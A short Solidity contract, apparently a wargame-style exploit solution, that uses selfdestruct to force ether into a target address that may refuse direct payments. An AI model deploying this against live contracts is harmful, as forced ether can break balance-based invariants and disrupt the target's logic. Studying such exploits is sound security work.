// SPDX-License-Identifier: MIT

pragma solidity ^0.8.10;

contract ForceHack {
    address hack;

    constructor(address _hack) payable {
        hack = _hack;
    }

    function boom() external {
        selfdestruct(payable(hack));
    }
}
